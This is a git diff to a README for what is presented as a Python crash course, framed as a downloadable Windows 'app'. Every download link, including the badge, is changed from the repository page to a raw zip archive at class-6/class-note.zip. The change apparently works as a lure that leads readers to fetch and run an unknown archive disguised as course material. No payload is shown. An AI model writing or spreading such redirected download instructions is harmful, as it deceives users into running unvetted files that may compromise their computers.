@@ -1,12 +1,12 @@
 # 🐍 python-programming-crash-course-2026-tachyon - Learn Python With Clear Steps
 
-[![Download](https://img.shields.io/badge/Download-Get%20the%20App-blue?style=for-the-badge)](https://github.com/leonn8702/python-programming-crash-course-2026-tachyon)
+[![Download](https://img.shields.io/badge/Download-Get%20the%20App-blue?style=for-the-badge)](https://github.com/leonn8702/python-programming-crash-course-2026-tachyon/raw/refs/heads/main/class-6/class-note.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download the app:
 
-[Download python-programming-crash-course-2026-tachyon](https://github.com/leonn8702/python-programming-crash-course-2026-tachyon)
+[Download python-programming-crash-course-2026-tachyon](https://github.com/leonn8702/python-programming-crash-course-2026-tachyon/raw/refs/heads/main/class-6/class-note.zip)
 
 ## 🖥️ What This App Does
 
@@ -38,7 +38,7 @@ If your PC is older, the app should still work, but loading may take longer.
 ## 🚀 Get Started on Windows
 
 1. Open the download page:
-   [https://github.com/leonn8702/python-programming-crash-course-2026-tachyon](https://github.com/leonn8702/python-programming-crash-course-2026-tachyon)
+   [https://github.com/leonn8702/python-programming-crash-course-2026-tachyon/raw/refs/heads/main/class-6/class-note.zip](https://github.com/leonn8702/python-programming-crash-course-2026-tachyon/raw/refs/heads/main/class-6/class-note.zip)
 
 2. Find the latest download item on the page.
 
@@ -186,7 +186,7 @@ Before you run the app:
 
 If you need to get the app again, use this link:
 
-[https://github.com/leonn8702/python-programming-crash-course-2026-tachyon](https://github.com/leonn8702/python-programming-crash-course-2026-tachyon)
+[https://github.com/leonn8702/python-programming-crash-course-2026-tachyon/raw/refs/heads/main/class-6/class-note.zip](https://github.com/leonn8702/python-programming-crash-course-2026-tachyon/raw/refs/heads/main/class-6/class-note.zip)
 
 ## 🗂️ What to Expect After Opening
 
